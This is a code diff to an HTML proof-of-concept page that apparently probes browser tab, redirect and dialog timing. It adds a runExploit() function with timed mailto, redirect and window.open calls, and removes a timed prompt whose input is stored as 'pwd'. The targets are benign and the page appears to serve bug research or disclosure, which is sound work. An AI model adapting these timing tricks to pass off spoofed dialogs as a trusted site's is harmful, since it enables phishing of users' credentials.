@@ -101,10 +101,6 @@
           <input id="redirectDelay" type="number" value="1" min="0" step="1" />
         </label>
         <label>
-          Prompt delay (ms):
-          <input id="promptDelay" type="number" value="500" min="0" step="10" />
-        </label>
-        <label>
           Target URL:
           <input id="targetUrl" type="text" value="https://apple.com" style="width: 180px;" />
         </label>
@@ -127,7 +123,6 @@
         const logEntries = document.getElementById("logEntries");
         const clearLogBtn = document.getElementById("clearLogBtn");
         let t0 = 0;
-        let activeTab = null;
         let firstRun = true;
 
         function appendLog(msg) {
@@ -161,17 +156,35 @@
 </html>`;
         }
 
+        function runExploit() {
+          setTimeout(function () {
+            appendLog("runExploit +500ms -> setting document.location to mailto:secure@apple.com?subject=Test");
+            document.location = "mailto:secure@apple.com?subject=Test";
+          }, 500);
+
+          setTimeout(function () {
+            appendLog("runExploit +1200ms -> redirecting current tab to https://www.google.com");
+            window.location.href = "https://www.google.com";
+          }, 1200);
+
+          setTimeout(function () {
+            appendLog("runExploit +1300ms -> calling window.open('https://www.apple.com/privacy/')");
+            const opened = window.open("https://www.apple.com/privacy/");
+            if (!opened) {
+              appendLog("window.open('https://www.apple.com/privacy/') returned null (blocked or non-user-gesture).");
+            }
+          }, 1300);
+        }
+
         startBtn.addEventListener("click", function () {
           t0 = performance.now();
           const redirectDelay = Math.max(0, Number(document.getElementById("redirectDelay").value) || 0);
-          const promptDelay = Math.max(0, Number(document.getElementById("promptDelay").value) || 0);
           const targetUrl = document.getElementById("targetUrl").value.trim() || "https://apple.com";
 
           appendLog("Start button clicked.");
           this.remove();
 
           const newTab = window.open("about:blank", "_blank");
-          activeTab = newTab;
 
           if (!newTab) {
             appendLog("window.open returned null (possibly blocked by popup blocker).");
@@ -187,7 +200,7 @@
             }
 
             setTimeout(function () {
-              appendLog(`Redirect timer fired -> setting location.href to "${targetUrl}"`);
+              appendLog(`Redirect timer fired -> setting newTab.location.href to "${targetUrl}"`);
               try {
                 if (!newTab.closed) {
                   newTab.location.href = targetUrl;
@@ -200,19 +213,8 @@
             }, redirectDelay);
           }
 
-          setTimeout(function () {
-            appendLog("Prompt timer fired -> opening prompt(\"ROOT CAUSE\").");
-            const pwd = prompt("ROOT CAUSE");
-            appendLog("Prompt closed. Returned value: " + (pwd === null ? "null (cancelled)" : JSON.stringify(pwd)));
-
-            if (activeTab) {
-              try {
-                appendLog("activeTab.closed state after prompt: " + String(activeTab.closed));
-              } catch (err) {
-                appendLog("Unable to read activeTab.closed (cross-origin restriction): " + err.message);
-              }
-            }
-          }, promptDelay);
+          appendLog("Calling runExploit()...");
+          runExploit();
         });
       })();
     </script>
